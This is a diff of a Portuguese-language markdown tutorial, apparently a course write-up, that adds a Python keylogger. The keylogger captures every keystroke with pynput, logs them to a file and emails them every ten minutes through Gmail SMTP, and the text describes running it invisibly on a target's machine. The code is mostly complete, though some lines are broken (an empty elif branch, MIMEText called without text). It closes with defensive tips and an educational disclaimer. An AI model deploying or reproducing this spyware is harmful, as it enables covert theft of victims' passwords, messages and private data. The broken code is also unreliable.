@@ -190,11 +190,11 @@ IGNORAR = {
 }
 
 ```
-3- Depois de fazer a lista de teclas ignoradas, iremos dar a funcao ****on_press**** é uma funcao de extrema importancia, pois toda vez que o teclado for precionado, automaticamente ela sera chamada. 
+3- Depois de fazer a lista de teclas ignoradas, iremos dar a funcao` ****on_press**** `é uma funcao de extrema importancia, pois toda vez que o teclado for precionado, automaticamente ela sera chamada. 
 
-3a-E dentro do dela iremos usar um comando chamado ***TRY*** que tem a funcao de tentar capturar os caracteres do teclado se for uma tecla normal" como uma letra ou numero". 
+3a-E dentro do dela iremos usar um comando chamado `***TRY***` que tem a funcao de tentar capturar os caracteres do teclado se for uma tecla normal" como uma letra ou numero". 
 
-3b-A funcao ***char*** vai ser responsavel por escrever os caracteres em um arquivo chamado "log.txt"
+3b-A funcao `***char*** `vai ser responsavel por escrever os caracteres em um arquivo chamado "log.txt"
 
 ```python
 def on_press(Key):
@@ -233,9 +233,9 @@ Para finalizar usaremos:
 
 ```
 
-Listener: É a onde iniciamos o comando de esculta
+`Listener: É a onde iniciamos o comando de esculta`
 
-Listener.join : Este vai manter o script rodando ate que ele seja interrompido de forma manual.
+`Listener.join : Este vai manter o script rodando ate que ele seja interrompido de forma manual.`
 
 O comando ja esta quase pronto
 
@@ -255,3 +255,126 @@ python .\keylogger.pyw
 ```
 com este comando o key ja estara rondando de forma invisivel na maquina do alvo e capturando cada tecla precionada em tempo real em seu py.
 
+### Agora iremos Para a etapa seguinte que é fazer um Keylogger que manda as mensagem via e-mail
+
+Para que funcione precisamos criar um e-mail no gmail , para poder fazer os testes e depois configurar este e-mail para que ele possa receber os logs.
+
+Vamos comecar importando as bibliotecas, para que o script possa funcionar perfeitamente.
+
+```python
+from pynput import keyboard
+import smtplib
+from email.mime.text import MIMEText
+from threading import Timer 
+
+log = ""
+```
+`Pynput : monitorar e controlar dispositivos de entrada, especificamente o mouse e o teclado`
+
+`smtplib: Tem a funcao de formatar como mensagem de texto`
+
+`Time da biblioteca threading: Sera o que nos permitirar fazer os agendamentos dos envios de tempo em tempo
+`
+
+Depois de importa as bibliotecas iremos comecar as configuracoes do email.
+```python
+# Configurações do email
+EMAIL_ORIGEM = "seu_email@gmail.com"
+EMAIL_DESTINO = "email_destino@gmail.com"
+SENHA_EMAIL = "sua_senha"
+```
+Aqui é uma parte importante pois , esta parte fica a parte dos armazenamento dos logs para no tempo certo ele manda para o email.
+Tambem fica a rotacao do servidor , onde o script faz com que ele logue na conta, envie o texto , limpe a log e saia do email. 
+Isto garante a boa funcionabilidade do script .
+```python
+def enviar_email():
+    global log
+    if log:
+        msg = MIMEText()
+        msg['Subject'] = "Dados Capturados pelo Keylogger"
+        msg['From'] = EMAIL_ORIGEM
+        msg['To'] = EMAIL_DESTINO   
+    try:
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(EMAIL_ORIGEM, SENHA_EMAIL )
+        server.send_message(msg)
+        server.quit()
+    except Exception as e:
+        print(f"Erro ao enviar email: {e}")
+    log = ""
+```
+Aqui é onde o agente faz o envio a cada periodo de tempo, onde o tempo que configura é o atacante. Pode ser a cada 60 segundou ou o tempo que achar melhor.
+```python
+    Timer(600, enviar_email).start()
+```
+ Agora iremos organizar as teclas que nao sao considerada caracteres como " enter, espaco, backspace"
+```python
+def on_press(Key):
+    global log
+    try:
+        with open("log.txt", "a", encoding="utf-8") as f:
+            f.write(Key.char)
+            log += Key.char
+    except AttributeError:
+        with open("log.txt", "a", encoding="utf-8") as f:
+            if Key == keyboard.Key.space:
+                f.write("  ")
+                log += "  "
+            elif Key == keyboard.Key.enter:
+                f.write("\n")
+                log += "\n"
+            elif Key == keyboard.Key.tab:
+                f.write(" \t")
+                log += " \t"
+            elif Key == keyboard.Key.backspace:
+                f.write(" < ")
+                log += "  "
+            elif Key == keyboard.Key.esc:
+                f.write(" [esc] ")
+                log += " [esc] "
+            elif Key in IGNORAR:
+            else:
+                pass # Ignorar teclas como Shift, Ctrl, Alt, etc.
+```
+Sem este comando se tentarmos capturar estas teclas ele vai dar como except, por isto temos que orientar os except, para corrigir nesta situacao.
+
+Para finalizar usaremos:
+```python
+# Iniciar o keylogger e o envio de email
+
+with keyboard.Listener(on_press=on_press) as listener:
+    enviar_email()  # Iniciar o envio de email
+    listener.join()
+
+```
+
+Depois de finalizar o scrript use o comando:
+
+```
+python .\keylogger_email.py
+```
+
+Pronto o script ja vai estar rodando e mandando os caracteres para seu e-mail.
+
+## Uma breve reflexao
+
+Depois de concluir este modulo , e este curso , percebo o quao vuneravel estamos na internet, nao por falta de seguranca pois temos programas como antivirus , firewalls e ferramentas de monitoramentos , mas pela falta de conhecimento que temos, vivemos em uma era onde tudo que nos fazemos esta no celular ou no computador, onde acesso a bancos, pix, documentos,etc.. Tudo esta conectada na internet, e nos nao temos uma certa precaução com os meios que usamos, qualquer link clickado, qualquer arquivo aberto, qualquer programa execultado, nao tomamos o minimo de cautela.
+Vemos aqui neste Aprendizado, que scripts simples de +- 50 linhas , pode fazer estragos dependendo do caso gigantesco , pois nao e so a perca do dinheiro, e a perca da privacidade , onde talvez um documento de extrema importancia foi criptografado e voce vai esta a merce de alguem que vai te estorqui, fazer pressao psicologica " famosa engenharia social" e roubar teu dinheiro por um descuido seu, que talvez depois de voce pagar o que ele quer, ele mesmo assim pode vazar os seus dados ou simplismente so sumir.
+#### Para voce que quer se previnir aqui vai algumas dicas
+1- antivirus :
+O antivirus modernos vai usar mais que uma lista de aquivos maliciosos, ele vai analizar os comportamentos dos programas, vai detectar padroes de ataques e vai bloquear as atividades suspeitas. " nunca use um antivirusa crackeado pois dentro dele voce pode deixar alguma por aberta para o invasor"
+
+2- Firewall:
+O firewall tanto de sistema quanto de rede ele vai ajudar a controlar o trafego que entra e sai da sua maquina. Sempre mantenha ele atualizado.
+
+3-Programa de Monitoramento 
+Esta ferramenta vai monitorar o comportamento dos aplicativos. Estes programas mais modernos usam ia e machine learning para fazer as detecção de comportamentos estranho " anormais"
+
+4- Concientizacao
+Este esta acima de qualquer antivirus e firewall, Nao se deve sair clickando em tudo que ver, seja mais cauteloso , tenha sempre em mente que praticamente quase tudo hoje esta em seu celular ou pc, pois desde pagamentos ate documentos fazemos quase tudo online.
+
+5- Ultilizar ambientes isolados
+Voce que quer testar algum codigo desconhecido, abrir um arquivo suspeito ou fazer algo do tipo, use sempre uma vm " maquina virtual" , isso vai criar uma barreira entre seu sistema real e o ambiente de teste, vai previnir que se algo malicioso ou danoso esteja dentro do arquivo, ele nao corrompa seu sistema ou comprometa algum arquivo. 
+
+#### Todo o conteudo Feito aqui e para fins Educacionais , nada disso deve ser usado fora de um ambiente de testes , o ponto principal e o aprendizado e ver na pratica como estes malwares realmente fuciona para conseguir se proteger e consientizar as demais.
